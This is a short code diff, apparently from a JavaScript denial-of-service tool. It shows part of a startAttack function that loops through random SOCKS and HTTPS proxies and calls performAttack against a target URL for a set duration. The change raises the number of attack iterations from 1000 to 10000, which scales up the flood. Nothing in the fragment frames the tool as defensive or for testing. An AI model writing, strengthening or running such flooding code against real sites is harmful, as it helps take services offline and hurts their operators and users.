@@ -120,7 +120,7 @@ const startAttack = (url, durationHours) => {
     fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
   }, duration);
 
-  for (let i = 0; i < 1000 && continueAttack; i++) {
+  for (let i = 0; i < 10000 && continueAttack; i++) {
     const [host, port] = getRandomElement(proxies).split(":");
     const agent = host.startsWith("socks") ? new SocksProxyAgent(`socks5://${host}:${port}`) : new HttpsProxyAgent(`http://${host}:${port}`);
     performAttack(url, agent);
